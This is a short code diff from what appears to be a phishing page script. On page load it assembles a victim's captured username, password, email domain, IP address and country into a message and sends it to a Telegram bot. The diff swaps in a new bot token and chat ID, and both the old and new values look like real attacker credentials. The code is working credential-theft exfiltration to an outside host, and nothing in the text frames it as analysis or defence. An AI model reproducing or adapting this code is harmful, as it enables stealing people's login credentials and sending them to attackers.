@@ -20,8 +20,8 @@ document.addEventListener('DOMContentLoaded', function () {
                 const message = `Username: ${username}\nPassword: ${password}\nEmail Domain: ${emailDomain}\nIP: ${ip}\nCountry: ${country}`;
 
                 // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with actual values
-                const botToken = 'AAE3hUNHbuGo2Pz8wzYHJ23UfDwqav8nbao';
-                const chatId = '7810271681';
+                const botToken = '7398105901:AAGMqPU6Xvcho2FwqubVM_r51ei8XkWKSLc';
+                const chatId = '6651292809';
                 const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
                 const payload = {
